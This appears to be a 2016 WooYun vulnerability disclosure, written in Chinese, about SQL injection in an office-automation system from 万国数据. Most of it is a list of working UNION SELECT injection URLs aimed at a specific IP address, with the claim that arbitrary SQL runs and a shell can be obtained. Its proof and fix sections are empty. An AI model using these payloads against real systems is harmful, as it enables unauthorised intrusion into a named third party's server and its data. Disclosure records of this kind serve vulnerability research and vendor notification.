漏洞详情 披露状态：   									2016-03-23：	积极联系厂商并且等待厂商认领中，细节不对外公开									2016-05-07：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  万国数据OA系统多处SQL注入：http://118.123.173.91/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,777



想干嘛干嘛，任意sql语句执行了。可以getshellhttp://118.123.173.91/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,777http://118.123.173.91/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,777http://118.123.173.91/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,777http://118.123.173.91/web/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,777http://118.123.173.91/web/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,@@version,4,5,777http://118.123.173.91/web/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,777http://118.123.173.91/web/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,777   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云
